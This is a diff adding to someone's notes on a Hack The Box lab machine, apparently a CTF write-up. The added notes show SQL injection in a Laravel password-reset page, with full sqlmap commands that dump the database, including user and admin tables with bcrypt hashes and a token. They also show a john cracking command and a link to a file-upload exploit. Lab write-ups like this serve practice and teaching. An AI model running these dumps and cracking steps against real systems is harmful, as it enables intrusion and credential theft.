@@ -25,3 +25,97 @@ Registering an account doesn't appear to lead to anything interesting, just a pa
 Two cookies are set upon our login, a laravel_session cookie and xsrf_token.  Oddly, I am getting an HTTP 419 when trying to authenticate to the admin portal, which per a quick Google search indicates that my session may be timing out?  From this, it sounds like it's likely from the csrf tokens: https://stackoverflow.com/questions/46266553/why-does-the-laravel-api-return-a-419-status-code-on-post-and-put-methods
 
 I moved to testing the reset password page, which appears to be sql injectable as it returns a 500 when you add a '.  Running this: sqlmap -r req.txt --level=3 --risk=3 I did return a note that SQLMAP detected the backend db as MySQL, but further testing was stopped due to the server returning a bunch of 500 error codes.
+
+sqlmap -r req.txt --level=3 --risk=3 --dbms=mysql -dbs --batch
+[*] information_schema
+[*] performance_schema
+[*] usage_blog
+
+
+
+sqlmap -r req.txt --level=3 --risk=3 --dbms=mysql -dump -D usage_blog --batch 
+
+[22:54:58] [INFO] resuming partial value: admin_operation_log
+[22:55:14] [INFO] resuming partial value: admin_permissions
+[22:55:28] [INFO] resuming partial value: admin_roleU
+[22:55:28] [INFO] retrieved: menu
+[22:55:33] [INFO] resuming partial value: admin_role_permissions
+[22:55:53] [INFO] resumed: admin_role_users
+[22:55:53] [INFO] resumed: admin_roles
+[22:55:53] [INFO] resuming partial value: admin_user_permissions
+[22:56:18] [INFO] resumed: admin_users
+[22:56:18] [INFO] resumed: blog
+[22:56:18] [INFO] resuming partial value: failed_jobs
+[22:56:24] [INFO] resuming partial value: migrations
+[22:56:32] [INFO] resuming partial value: password_reset_tokens
+[22:56:38] [INFO] resuming partial value: personal_access_tokens
+[22:56:58] [INFO] resumed: users
+[22:56:58] [INFO] fetching columns for table 'admin_roles' in database 'usage_blog'
+[22:56:58] [INFO] retrieved: 5
+[22:56:59] [INFO] retrieved: id
+[22:57:06] [INFO] retrieved: name
+[22:57:12] [INFO] retrieved: slug
+[22:57:20] [INFO] retrieved: created_at
+[22:57:31] [INFO] retrieved: updated_at
+[22:57:47] [INFO] fetching entries for table 'admin_roles' in database 'usage_blog'
+[22:57:47] [INFO] fetching number of entries for table 'admin_roles' in database 'usage_blog'
+[22:57:47] [INFO] retrieved: 1
+[22:57:47] [INFO] retrieved: Administrator
+[22:58:08] [INFO] retrieved: 2023-08-13 02:48:26
+[22:58:37] [INFO] retrieved: 1
+[22:58:38] [INFO] retrieved: administrator
+[22:58:52] [INFO] retrieved: 2023-08-13 02:48:26
+Database: usage_blog
+Table: admin_roles
+[1 entry]
++----+---------------+---------------+---------------------+---------------------+
+| id | slug          | name          | created_at          | updated_at          |
++----+---------------+---------------+---------------------+---------------------+
+| 1  | administrator | Administrator | 2023-08-13 02:48:26 | 2023-08-13 02:48:26 |
++----+---------------+---------------+---------------------+---------------------+
+
+[22:59:23] [INFO] table 'usage_blog.admin_roles' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_roles.csv'                                                                                   
+[22:59:23] [INFO] fetching columns for table 'migrations' in database 'usage_blog'
+[22:59:23] [INFO] retrieved: 3
+[22:59:24] [INFO] retrieved: id
+[22:59:27] [INFO] retrieved: migration
+[22:59:38] [INFO] retrieved: batch
+[22:59:46] [INFO] fetching entries for table 'migrations' in database 'usage_blog'
+[22:59:46] [INFO] fetching number of entries for table 'migrations' in database 'usage_blog'
+[22:59:46] [INFO] retrieved: 6
+[22:59:48] [INFO] retrieved: 1
+[22:59:49] [INFO] retrieved: 1
+[22:59:50] [INFO] retrieved: 2014_10_12_000000_create_users_table
+
+
+
+
+
+sqlmap -r req.txt --level=3 --risk=3 --dbms=mysql -dump -D usage_blog -T users --batch
+Table: users
+[4 entries]
++----+-------------------+-------------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
+| id | email             | name        | password                                                     | created_at          | updated_at          | remember_token | email_verified_at |
++----+-------------------+-------------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
+| 1  | raj@raj.com       | raj         | $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. | 2023-08-17 03:16:02 | 2023-08-17 03:16:02 | NULL           | NULL              |
+| 2  | raj@usage.htb     | raj         | $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa | 2023-08-22 08:55:16 | 2023-08-22 08:55:16 | NULL           | NULL              |
+| 3  | me@me.com         | nocr1z      | $2y$10$rdf3dn/KpvAA1hoHdl39mu04BxE44Lz2qSOn4VKyzjvCyRu6r53IO | 2024-05-08 23:26:03 | 2024-05-08 23:26:03 | NULL           | NULL              |
+| 4  | batman@gotham.com | bruce wayne | $2y$10$JR.pEyvszUVqv40okxhDTuYHyP8zeCGUJsTvrtBhTjEOymgFEizLe | 2024-05-09 02:34:48 | 2024-05-09 02:34:48 | NULL           | NULL              |
++----+-------------------+-------------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
+
+
+sqlmap -r req.txt --level=3 --risk=3 --dbms=mysql -dump -D usage_blog -T admin_users --batch
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+----------
+
+
+Okay so I am not great with SQLMap if that's not obvious, I'll keep all my notes here just so future me can see my thought process, but I eventually was able to grab the admin password hash and login to the admin portal.
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt > whatever1
+
+Upon logging in, we find a page with the versions/extensions installed on the server.  One of which (if you just start copy/pasting them) has a file upload vulnerability.  Originially I was directed to a Synk article, but found the PoC here: https://flyd.uk/post/cve-2023-24249/ which eventually lead to me getting the user flag.
+
+
